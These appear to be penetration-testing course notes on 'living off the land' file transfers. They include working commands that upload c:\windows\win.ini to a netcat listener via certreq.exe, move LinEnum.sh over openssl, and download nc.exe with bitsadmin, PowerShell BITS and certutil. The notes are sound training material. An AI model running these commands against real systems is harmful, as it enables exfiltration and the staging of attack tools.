### Living off The Land

[LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)

[GTFOBins for Linux Binaries](https://gtfobins.github.io/)

```
# The phrase "Living off the land" was coined by Christopher Campbell @obscuresec & Matt Graeber @mattifestation at DerbyCon 3.

# The term LOLBins (Living off the Land binaries) came from a Twitter discussion 
# on what to call binaries that an attacker can use to perform actions beyond their original purpose.

# "Living off the Land binaries" can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses
```

### Example for Win with [CertReq.exe ](https://lolbas-project.github.io/lolbas/Binaries/Certreq/)

```
# We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.

C:\file> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini      # Upload win.ini to our localhost
output:
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)

# This will send the file to our Netcat session, and we can copy-paste its contents.

sudo nc -lvnp 8000                            # File Received in our Netcat Session
output:
listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819

```

### Example for linux with [OpenSSL](https://www.openssl.org/)

```
# It's frequently installed and often included in other software distributions, 
# with sysadmins using it to generate security certificates, among other tasks. 
# OpenSSL can be used to send files "nc style."

# We need to create a certificate and start a server in our localhost.

openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem    # Create Certificate in our localhost

openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh     # Stand up the Server in our localhost

openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh                                # Download File from the Compromised Machine
```

### Other Common Living off the Land tools

[Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)

```
# Bitsadmin Download function
# The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. 
# It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

PS C:\file> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\file-student\Desktop\nc.exe   # File Download with Bitsadmin

# PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

PS C:\file> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"     # Download
```

### Certutil

```
# It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. 
# However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.

C:\file> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe   # Download a File with Certutil
```

### Extra Practice
```
# It's worth perusing the LOLBAS and GTFOBins websites and experimenting with as many file transfer methods as possible. 
# The more obscure, the better. 
# You never know when you'll need one of these binaries during an assessment, 
# and it'll save time if you already have detailed notes on multiple options. 
# Some of the binaries that can be leveraged for file transfers may surprise you. :)
